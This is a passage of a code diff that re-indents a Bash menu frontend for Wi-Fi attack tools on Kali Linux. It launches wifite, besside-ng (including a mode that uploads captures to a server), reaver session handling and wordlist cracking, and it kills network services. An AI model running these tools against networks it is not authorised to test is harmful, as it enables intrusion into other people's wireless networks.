-# NOT ACTUALLY USED FOR WPS ATTACK
+	# NOT ACTUALLY USED FOR WPS ATTACK
 
-currentTask="aircrackDecryptWPS"
+	currentTask="aircrackDecryptWPS"
 
-blank=""
+	blank=""
 
 }
 
 
 reaverSaveCurrentSessionFile(){
 
-currentTask="reaverSaveCurrentSessionFile"
+	currentTask="reaverSaveCurrentSessionFile"
 
-if [ "$bssidCharOnly" != "" ];then
+	if [ "$bssidCharOnly" != "" ];then
 
-cp ../../$reaverSessionPath/$bssidCharOnly.wpc "$capturePathWPS"
+		cp ../../$reaverSessionPath/$bssidCharOnly.wpc "$capturePathWPS"
 
-fi
+	fi
 
 }
 
@@ -4753,11 +4765,11 @@ reaverSaveAllSessionFiles(){
 
 currentTask="reaverSaveCurrentSessionFile"
 
-if [ "$bssidCharOnly" != "" ];then
+	if [ "$bssidCharOnly" != "" ];then
 
-cp ../../$reaverSessionPath/*.wpc "$capturePathWPS"
+		cp ../../$reaverSessionPath/*.wpc "$capturePathWPS"
 
-fi
+	fi
 
 }
 
@@ -4775,28 +4787,28 @@ fi
 
 menuAttacksAllWifiteAuto(){
 
-currentTask="menuAttacksAllWifiteAuto"
-lastMenuID="menuAttacksAllWifiteAuto"
+	currentTask="menuAttacksAllWifiteAuto"
+	lastMenuID="menuAttacksAllWifiteAuto"
 
-killAll
+	killAll
 
-$terminal $wifiteAttackAll &
+	$terminal $wifiteAttackAll &
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The wifite session should be launched in a separate window."
-echo ""
-echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
-echo ""
-echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
-echo ""
+	echo ""
+	echo "The wifite session should be launched in a separate window."
+	echo ""
+	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
+	echo ""
+	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
+	echo ""
 
-read pause
+	read pause
 
-killAll
-menuMain
+	killAll
+	menuMain
 
 }
 
@@ -4816,132 +4828,132 @@ menuMain
 
 bessideMain(){
 
-currentTask="bessideMain"
+	currentTask="bessideMain"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "Select a mode and press ENTER:"
-echo ""
-echo ""
-echo "1) Normal"
-echo ""
-echo "2) WPA Only"
-echo ""
-echo "3) Upload"
-echo ""
-echo "4) Set Flood Rate"
-echo ""
-echo "5) Return To Previous Menu"
-echo ""
-echo ""
+	echo ""
+	echo "Select a mode and press ENTER:"
+	echo ""
+	echo ""
+	echo "1) Normal"
+	echo ""
+	echo "2) WPA Only"
+	echo ""
+	echo "3) Upload"
+	echo ""
+	echo "4) Set Flood Rate"
+	echo ""
+	echo "5) Return To Previous Menu"
+	echo ""
+	echo ""
 
-read getBessideMode
+	read getBessideMode
 
-case "$getBessideMode" in
+	case "$getBessideMode" in
 
-"")
-bessideMain
-;;
+	"")
+	bessideMain
+	;;
 
-"1")
-bessideNormal
-;;
+	"1")
+	bessideNormal
+	;;
 
-"2")
-bessideWPAOnly
-;;
+	"2")
+	bessideWPAOnly
+	;;
 
-"3")
-bessideUpload
-;;
+	"3")
+	bessideUpload
+	;;
 
-"4")
-bessideSetFloodRate
-;;
+	"4")
+	bessideSetFloodRate
+	;;
 
-"5")
-$lastMenuID
-;;
+	"5")
+	$lastMenuID
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-bessideMain
-;;
+	*)
+	bessideMain
+	;;
 
-esac
+	esac
 
 }
 
 
 bessideNormal(){
 
-currentTask="bessideNormal"
+	currentTask="bessideNormal"
 
-$terminal besside-ng -b $bssid -c $channel -vv $interfaceMonitor
+	$terminal besside-ng -b $bssid -c $channel -vv $interfaceMonitor
 
 }
 
 
 bessideUpload(){
 
-currentTask="bessideUpload"
+	currentTask="bessideUpload"
 
-$terminal besside-ng -b $bssid -c $channel -s $serverWPA -vv $interfaceMonitor
+	$terminal besside-ng -b $bssid -c $channel -s $serverWPA -vv $interfaceMonitor
 
 }
 
 
 bessideWPAOnly(){
 
-currentTask="bessideWPAOnly"
+	currentTask="bessideWPAOnly"
 
-$terminal besside-ng -b $bssid -c $channel -W -vv $interfaceMonitor
+	$terminal besside-ng -b $bssid -c $channel -W -vv $interfaceMonitor
 
 }
 
 
 bessideSetFloodRate(){
 
-currentTask="bessideSetFloodRate"
+	currentTask="bessideSetFloodRate"
 
-bessideFloodRate=""
+	bessideFloodRate=""
 
 }
 
@@ -4976,79 +4988,79 @@ bessideFloodRate=""
 
 killProcesses(){
 
-currentTask="killProcesses"
+	currentTask="killProcesses"
 
-killall NetworkManager
-killall NetworkManagerDispatcher
-#killall wpa_supplicant
-#killall avahi-daemon
+	killall NetworkManager
+	killall NetworkManagerDispatcher
+	#killall wpa_supplicant
+	#killall avahi-daemon
 
 }
 
 
 restartProcesses(){
 
-currentTask="restartProcesses"
+	currentTask="restartProcesses"
 
-#killall NetworkManager
-NetworkManager
+	#killall NetworkManager
+	NetworkManager
 
-#killall NetworkManagerDispatcher
-NetworkManagerDispatcher
+	#killall NetworkManagerDispatcher
+	NetworkManagerDispatcher
 
-#wpa_supplicant
-#avahi-daemon
+	#wpa_supplicant
+	#avahi-daemon
 
 }
 
 
 killWifite(){
 
-currentTask="killWifite"
+	currentTask="killWifite"
 
-findWifitePID=$(ps -A | grep "wifite" | head -c5)
-killWifiteTemp=$(kill $findWifitePID)
+	findWifitePID=$(ps -A | grep "wifite" | head -c5)
+	killWifiteTemp=$(kill $findWifitePID)
 
 }
 
 
 killAirodump(){
 
-currentTask="killAirodump"
+	currentTask="killAirodump"
 
-findAirodumpPID=$(ps -A | grep "airodump-ng" | head -c5)
-killAirodumpTemp=$(kill $findAirodumpPID)
-killAirodumpTemp=$(killall airodump-ng)
+	findAirodumpPID=$(ps -A | grep "airodump-ng" | head -c5)
+	killAirodumpTemp=$(kill $findAirodumpPID)
+	killAirodumpTemp=$(killall airodump-ng)
 
 }
 
 
 killAireplay(){
 
-currentTask="killAireplay"
+	currentTask="killAireplay"
 
-findAireplayPID=$(ps -A | grep "aireplay-ng" | head -c5)
-killAireplayTemp=$(kill $findAireplayPID)
+	findAireplayPID=$(ps -A | grep "aireplay-ng" | head -c5)
+	killAireplayTemp=$(kill $findAireplayPID)
 
 }
 
 
 killAircrack(){
 
-currentTask="killAircrack"
+	currentTask="killAircrack"
 
-findAircrackPID=$(ps -A | grep "aircrack-ng" | head -c5)
-killAircrackTemp=$(kill $findAircrackPID)
+	findAircrackPID=$(ps -A | grep "aircrack-ng" | head -c5)
+	killAircrackTemp=$(kill $findAircrackPID)
 
 }
 
 
 killAll(){
 
-killAirodump
-killAireplay
-killAircrack
-killWifite
+	killAirodump
+	killAireplay
+	killAircrack
+	killWifite
 
 }
 
@@ -5068,171 +5080,171 @@ killWifite
 
 cleanSessionFiles(){
 
-currentTask="cleanSessionFiles"
+	currentTask="cleanSessionFiles"
 
-banner
-echo ""
-echo "Checking Network Status...."
-echo ""
-echo ""
+	banner
+	echo ""
+	echo "Checking Network Status...."
+	echo ""
+	echo ""
 
-rm "$capturePath/wep/wep.sessions"
-rm "$capturePath/wps/wps.sessions"
-rm "$capturePath/wpa/wpa.sessions"
-rm "$capturePath/wpa2/wpa2.sessions"
+	rm "$capturePath/wep/wep.sessions"
+	rm "$capturePath/wps/wps.sessions"
+	rm "$capturePath/wpa/wpa.sessions"
+	rm "$capturePath/wpa2/wpa2.sessions"
 
-banner
-echo ""
-echo "Checking Network Status...."
-echo ""
-echo ""
+	banner
+	echo ""
+	echo "Checking Network Status...."
+	echo ""
+	echo ""
 
 }
 
 
 backupSessionFiles(){
 
-currentTask="backupSessionFiles"
+	currentTask="backupSessionFiles"
 
-zip -9 -r sessions-backup-$displayDate3.zip sessions
+	zip -9 -r sessions-backup-$displayDate3.zip sessions
 
 }
 
 
 sessionWriteBeginNew(){
 
-currentTask="sessionWriteBeginNew"
+	currentTask="sessionWriteBeginNew"
 
-getCurrentDateAndTime
+	getCurrentDateAndTime
 
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "***** Begin New Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "***** Begin New Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
 
 }
 
 
 sessionWriteLoadPrevious(){
 
-currentTask="sessionWriteLoadPrevious"
+	currentTask="sessionWriteLoadPrevious"
 
-getCurrentDateAndTime
+	getCurrentDateAndTime
 
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "***** Load Previous Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "***** Load Previous Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
 
 }
 
 
 sessionWriteEndCurrent(){
 
-currentTask="sessionWriteEndCurrent"
+	currentTask="sessionWriteEndCurrent"
 
-getCurrentDateAndTime
+	getCurrentDateAndTime
 
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "***** End Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "***** End Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
 
 }
 
 
 sessionRemoveEmpty(){
 
-currentTask="sessionRemoveEmpty"
+	currentTask="sessionRemoveEmpty"
 
-banner
-echo ""
-echo "Checking Network Status...."
-echo ""
-echo ""
+	banner
+	echo ""
+	echo "Checking Network Status...."
+	echo ""
+	echo ""
 
-rm "$capturePath/$encryptionType/empty.sessions"
-rmdir "$capturePath/empty"
+	rm "$capturePath/$encryptionType/empty.sessions"
+	rmdir "$capturePath/empty"
 
-banner
-echo ""
-echo "Checking Network Status...."
-echo ""
-echo ""
+	banner
+	echo ""
+	echo "Checking Network Status...."
+	echo ""
+	echo ""
 
 }
 
 
 sessionCreatePaths(){
 
-getBSSIDCharOnly
+	getBSSIDCharOnly
 
-mkdir "$capturePath"
-mkdir "$capturePath/$encryptionType/"
+	mkdir "$capturePath"
+	mkdir "$capturePath/$encryptionType/"
 
 }
 
 
 sessionCopyNewCaptureFiles(){
 
-cp *.cap "$capturePath/$encryptionType"
-cp *.ivs "$capturePath/$encryptionType"
-cp *.xor "$capturePath/$encryptionType"
-cp *.csv "$capturePath/$encryptionType"
-cp *.netxml "$capturePath/$encryptionType"
+	cp *.cap "$capturePath/$encryptionType"
+	cp *.ivs "$capturePath/$encryptionType"
+	cp *.xor "$capturePath/$encryptionType"
+	cp *.csv "$capturePath/$encryptionType"
+	cp *.netxml "$capturePath/$encryptionType"
 
 }
 
 
 sessionSave(){
 
-currentTask="sessionSave"
+	currentTask="sessionSave"
 
-getCurrentDateAndTime
+	getCurrentDateAndTime
 
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "***** Save Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
-echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "***** Save Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
+	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
 
 }
 
 
 sessionLoad(){
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-currentTask="sessionLoad"
+	currentTask="sessionLoad"
 
-while read line           
-do           
-    echo -e "$line \n"           
-done <"$capturePath/$encryptionType/$encryptionType.sessions"
+	while read line           
+	do           
+		echo -e "$line \n"           
+	done <"$capturePath/$encryptionType/$encryptionType.sessions"
 
-echo ""
-echo ""
-echo ""
-echo "Scroll up to see all loaded sessions."
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to continue...."
-echo ""
-echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Scroll up to see all loaded sessions."
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to continue...."
+	echo ""
+	echo ""
 
-read pause
+	read pause
 
 }
 
@@ -5252,100 +5264,100 @@ read pause
 
 checkForEmptyEncrytionType(){
 
-currentTask="checkForEmptyEncrytionType"
+	currentTask="checkForEmptyEncrytionType"
 
-if [ "$encryptionType" == "empty" ];then
+	if [ "$encryptionType" == "empty" ];then
 
-banner
-bannerStats
+		banner
+		bannerStats
 
-echo ""
-echo "There is currently no Encryption Type selected!"
-echo ""
-echo ""
-echo "Press ENTER to return to main menu...."
-echo ""
-echo ""
+		echo ""
+		echo "There is currently no Encryption Type selected!"
+		echo ""
+		echo ""
+		echo "Press ENTER to return to main menu...."
+		echo ""
+		echo ""
 
-read pause
+		read pause
 
-menuMain
-fi
+		menuMain
+	fi
 
 }
 
 
 checkForEmptyBSSID(){
 
-currentTask="checkForEmptyBSSID"
+	currentTask="checkForEmptyBSSID"
 
-if [ "$bssid" == "" ];then
+	if [ "$bssid" == "" ];then
 
-banner
-bannerStats
+		banner
+		bannerStats
 
-echo ""
-echo "There is currently no BSSID saved in the previous session!"
-echo ""
-echo ""
-echo "Press ENTER to return to previous menu...."
-echo ""
-echo ""
+		echo ""
+		echo "There is currently no BSSID saved in the previous session!"
+		echo ""
+		echo ""
+		echo "Press ENTER to return to previous menu...."
+		echo ""
+		echo ""
 
-read pause
+		read pause
 
-$lastMenuID
-fi
+		$lastMenuID
+	fi
 
 }
 
 
 checkForEmptyESSID(){
 
-currentTask="checkForEmptyESSID"
+	currentTask="checkForEmptyESSID"
 
-if [ "$essid" == "" ];then
+	if [ "$essid" == "" ];then
 
-banner
-bannerStats
+		banner
+		bannerStats
 
-echo ""
-echo "There is currently no ESSID saved in the previous session!"
-echo ""
-echo ""
-echo "Press ENTER to return to previous menu...."
-echo ""
-echo ""
+		echo ""
+		echo "There is currently no ESSID saved in the previous session!"
+		echo ""
+		echo ""
+		echo "Press ENTER to return to previous menu...."
+		echo ""
+		echo ""
 
-read pause
+		read pause
 
-$lastMenuID
-fi
+		$lastMenuID
+	fi
 
 }
 
 
 checkForEmptyChannel(){
 
-currentTask="checkForEmptyChannel"
+	currentTask="checkForEmptyChannel"
 
-if [ "$channel" == "" ];then
+	if [ "$channel" == "" ];then
 
-banner
-bannerStats
+		banner
+		bannerStats
 
-echo ""
-echo "There is currently no CHANNEL saved in the previous session!"
-echo ""
-echo ""
-echo "Press ENTER to return to previous menu...."
-echo ""
-echo ""
+		echo ""
+		echo "There is currently no CHANNEL saved in the previous session!"
+		echo ""
+		echo ""
+		echo "Press ENTER to return to previous menu...."
+		echo ""
+		echo ""
 
-read pause
+		read pause
 
-$lastMenuID
-fi
+		$lastMenuID
+	fi
 
 }
 
@@ -5365,190 +5377,188 @@ fi
 
 getWirelessInterfaces(){
 
-currentTask="getWirelessInterfaces"
+	currentTask="getWirelessInterfaces"
 
-case "$isKaliTwo" in
+	case "$isKaliTwo" in
 
-"0")
-interface=$(iwconfig | grep "wlan" | head -c 5)
-interfaceMonitor=$(iwconfig | grep "mon" | head -c 4)
-;;
+		"0")
+		interface=$(iwconfig | grep "wlan" | head -c 5)
+		interfaceMonitor=$(iwconfig | grep "mon" | head -c 4)
+		;;
 
-"1")
-interface=$(iwconfig | grep "wlan" | head -c 5)
-interfaceMonitor=$(iwconfig | grep "wlan" | head -c 8)
-interfaceName=$interfaceMonitor
-fixKaliTwoMonError
-;;
+		"1")
+		interface=$(iwconfig | grep "wlan" | head -c 5)
+		interfaceMonitor=$(iwconfig | grep "wlan" | head -c 8)
+		interfaceName=$interfaceMonitor
+		fixKaliTwoMonError
+		;;
 
-esac
+	esac
 
-echo "$interface"
-echo "$interfaceMonitor"
-read pause
+	echo "$interface"
+	echo "$interfaceMonitor"
+	read pause
 
 }
 
 
 cleanCaptureFiles(){
 
-currentTask="cleanCaptureFiles"
+	currentTask="cleanCaptureFiles"
 
-rm *.cap
-rm *.ivs
-rm *.xor
-rm *.csv
-rm *.netxml
+	rm *.cap
+	rm *.ivs
+	rm *.xor
+	rm *.csv
+	rm *.netxml
 
 }
 
 
 getCustomList(){
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-currentTask="getCustomList"
+	currentTask="getCustomList"
 
-echo ""
-echo "Enter the path to the list and press ENTER:"
-echo ""
-echo ""
-echo "Example: /pentest/wordlists/dictionary1.txt"
-echo ""
-echo ""
+	echo ""
+	echo "Enter the path to the list and press ENTER:"
+	echo ""
+	echo ""
+	echo "Example: /pentest/wordlists/dictionary1.txt"
+	echo ""
+	echo ""
 
 
-read tmpCustomList
+	read tmpCustomList
 
-case "$tmpCustomList" in
+	case "$tmpCustomList" in
 
-"")
-getCustomList
-;;
+	"")
+	getCustomList
+	;;
 
-*)
-wordlist="$tmpCustomList"
-;;
+	*)
+	wordlist="$tmpCustomList"
+	;;
 
-esac
+	esac
 
 }
 
 
 getBSSIDCharOnly(){
 
-currentTask="getBSSIDCharOnly"
+	currentTask="getBSSIDCharOnly"
 
-if [ "$bssid" != "" ];then
+	if [ "$bssid" != "" ];then
 
-bssidCharOnly=$(echo $bssid | sed 's/[\:]//g')
-
-
-fi
+		bssidCharOnly=$(echo $bssid | sed 's/[\:]//g')
+	fi
 
 }
 
 
 getCurrentDate(){
 
-displayDate=$(date +"%D")
-displayDate2=$(date +"%Y-%m-%d")
-displayDate3=$(date +"%Y%m%d")
+	displayDate=$(date +"%D")
+	displayDate2=$(date +"%Y-%m-%d")
+	displayDate3=$(date +"%Y%m%d")
 
 }
 
 
 getCurrentTime(){
 
-displayTime=$(date +"%T")
+	displayTime=$(date +"%T")
 
 }
 
 
 getCurrentDateAndTime(){
 
-displayDateAndTime=$(date +"%D - %T")
-displayDateAndTime2=$(date +"%Y%m%d / %T")
-displayDateAndTime3=$(date +"%Y-%m-%d / %T")
+	displayDateAndTime=$(date +"%D - %T")
+	displayDateAndTime2=$(date +"%Y%m%d / %T")
+	displayDateAndTime3=$(date +"%Y-%m-%d / %T")
 
 }
 
 
 fixNegativeOneChannelError(){
 
-airmon-ng check kill
+	airmon-ng check kill
 
 }
 
 startNetworkManager(){
 
-NetworkManager
+	NetworkManager
 
 }
 
 killNetworkManager(){
 
-currentPID=$(ps -A | grep NetworkManager | cut -c 1-5)
-killTask=$(kill $currentPID)
+	currentPID=$(ps -A | grep NetworkManager | cut -c 1-5)
+	killTask=$(kill $currentPID)
 
-#echo "$currentPID"
-#echo "$killTask"
+	#echo "$currentPID"
+	#echo "$killTask"
 
-#read pause
+	#read pause
 
 }
 
 killWpaSupplicant(){
 
-#currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)
-#killTask=$(kill $currentPID)
+	#currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)
+	#killTask=$(kill $currentPID)
 
-killall wpa_supplicant
+	killall wpa_supplicant
 
-#echo "$currentPID"
-#echo "$killTask"
+	#echo "$currentPID"
+	#echo "$killTask"
 
-#read pause
+	#read pause
 
 }
 
 disableChannelHopping(){
 
-sleep 1
-ifconfig $interface down
+	sleep 1
+	ifconfig $interface down
 
 }
 
 enableChannelHopping(){
 
-sleep 1
-ifconfig $interface up
+	sleep 1
+	ifconfig $interface up
 
 }
 
 fixKaliTwoMonError(){
-echo "DEBUG: Kali 2.x Fix - Step 1"
-echo ""
-echo "$interface"
-echo "$interfaceMonitor"
-read pause
+	echo "DEBUG: Kali 2.x Fix - Step 1"
+	echo ""
+	echo "$interface"
+	echo "$interfaceMonitor"
+	read pause
 
-#ifconfig $interfaceMonitor down
-#sleep 2
-#iwconfig $interfaceMonitor mode monitor
-#sleep 2
-#ifconfig $interfaceMonitor up
+	#ifconfig $interfaceMonitor down
+	#sleep 2
+	#iwconfig $interfaceMonitor mode monitor
+	#sleep 2
+	#ifconfig $interfaceMonitor up
 
-ifconfig wlan0mon down
-iwconfig wlan0mon mode monitor
-ifconfig wlan0mon up
+	ifconfig wlan0mon down
+	iwconfig wlan0mon mode monitor
+	ifconfig wlan0mon up
 
-echo "DEBUG: Kali 2.x Fix - Step 2"
-echo ""
-echo "$interface"
-echo "$interfaceMonitor"
-read pause
+	echo "DEBUG: Kali 2.x Fix - Step 2"
+	echo ""
+	echo "$interface"
+	echo "$interfaceMonitor"
+	read pause
 }
 
 
